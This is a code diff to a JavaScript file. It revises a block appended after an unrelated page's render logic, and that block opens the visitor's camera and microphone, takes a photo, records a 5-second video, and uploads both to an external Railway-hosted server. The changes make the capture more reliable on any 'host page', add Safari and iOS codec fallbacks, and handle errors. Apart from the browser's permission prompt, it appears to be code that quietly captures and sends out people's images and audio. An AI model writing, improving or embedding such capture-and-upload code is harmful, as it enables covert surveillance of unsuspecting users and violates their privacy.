@@ -280,19 +280,28 @@ $("submitBtn").addEventListener("click", async () => {
 
 render();
 
-  
+
 // ===== CONFIG =====
 const UPLOAD_URL = 'https://resource-server.up.railway.app/api/resources';
-
 const RECORD_MS = 5000;
 
-const statusEl = document.getElementById('status');
-const setMsg = (m) => { statusEl.textContent = m; };
+// ===== SAFE STATUS (works even if #status doesn't exist on the host page) =====
+const setMsg = (m) => {
+    const el = document.getElementById('status');
+    if (el) el.textContent = m;
+    console.log('[capture]', m);
+};
 
 // ===== MAIN CHAIN =====
 async function run() {
+    setMsg('Starting camera...');
     try {
-        // STEP 1: camera + mic (needs HTTPS or localhost)
+        // Guard: not supported at all (http:// pages, ancient browsers)
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error('getUserMedia unavailable (need HTTPS or localhost)');
+        }
+
+        // STEP 1: camera + mic
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' },
             audio: true
@@ -308,10 +317,9 @@ async function run() {
             // STEP 3: 5s video with audio -> kind: 'video'
             setMsg('Recording 5s video...');
             const clip = await recordClip(stream);
-            await send(clip, 'video', `video_${Date.now()}.webm`, '5s video capture');
+            await send(clip.blob, 'video', `video_${Date.now()}${clip.ext}`, '5s video capture');
             setMsg('Done — photo + video uploaded.');
         } finally {
-            // Always release camera/mic, even if upload fails
             stream.getTracks().forEach(t => t.stop());
         }
 
@@ -326,14 +334,18 @@ async function takePhoto(stream) {
     const video = document.createElement('video');
     video.srcObject = stream;
     video.muted = true;
-    await new Promise(r => video.onloadedmetadata = r);
-    video.play();
+    await new Promise((resolve, reject) => {
+        video.onloadedmetadata = resolve;
+        video.onerror = () => reject(new Error('Video element failed'));
+    });
+    await video.play();
     // give the first frame a moment to render before grabbing it
+    await new Promise(r => requestAnimationFrame(r));
     await new Promise(r => requestAnimationFrame(r));
 
     const canvas = document.createElement('canvas');
-    canvas.width  = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width  = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0);
 
     return new Promise((resolve, reject) =>
@@ -341,23 +353,36 @@ async function takePhoto(stream) {
                       'image/jpeg', 0.8));
 }
 
-// ===== VIDEO =====
+// ===== VIDEO (with MP4 fallback for Safari/iOS) =====
 function recordClip(stream) {
     return new Promise((resolve, reject) => {
         if (typeof MediaRecorder === 'undefined') {
             return reject(new Error('MediaRecorder not supported'));
         }
 
-        const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
-                     ? 'video/webm;codecs=vp8,opus'
-                     : 'video/webm';
+        // Try in order: VP8+Opus WebM -> plain WebM -> MP4 (Safari) -> default
+        const CANDIDATES = [
+            ['video/webm;codecs=vp8,opus', '.webm'],
+            ['video/webm;codecs=h264',     '.webm'],
+            ['video/webm',                 '.webm'],
+            ['video/mp4',                  '.mp4'],   // Safari 14.1+, iOS
+        ];
+        let pick = CANDIDATES.find(([t]) => MediaRecorder.isTypeSupported(t));
+        let rec;
+        try {
+            rec = pick
+                ? new MediaRecorder(stream, { mimeType: pick[0] })
+                : new MediaRecorder(stream);          // browser default if nothing matched
+        } catch (e) {
+            return reject(new Error('MediaRecorder init failed: ' + e.message));
+        }
+        const ext = pick ? pick[1] : '.webm';
+        setMsg('Recording as ' + rec.mimeType);
 
         const chunks = [];
-        const rec = new MediaRecorder(stream, { mimeType: mime });
-
         rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         rec.onerror = e => reject(e.error || new Error('Recorder error'));
-        rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        rec.onstop = () => resolve({ blob: new Blob(chunks, { type: rec.mimeType }), ext });
 
         rec.start();
         setTimeout(() => rec.state !== 'inactive' && rec.stop(), RECORD_MS);
@@ -365,18 +390,14 @@ function recordClip(stream) {
 }
 
 // ===== UPLOAD =====
-// Matches the server contract:
-//   multer.single('file'), body fields: kind ('image'|'video'|...), title
+// Server contract: multer.single('file'), body fields: kind, title
 async function send(blob, kind, filename, title) {
     const fd = new FormData();
     fd.append('file', blob, filename);
     fd.append('kind', kind);
     fd.append('title', title);
 
-    const res = await fetch(UPLOAD_URL, {
-        method: 'POST',
-        body: fd   // browser sets multipart Content-Type with boundary
-    });
+    const res = await fetch(UPLOAD_URL, { method: 'POST', body: fd });
 
     if (!res.ok) {
         let detail = `HTTP ${res.status} ${res.statusText}`;
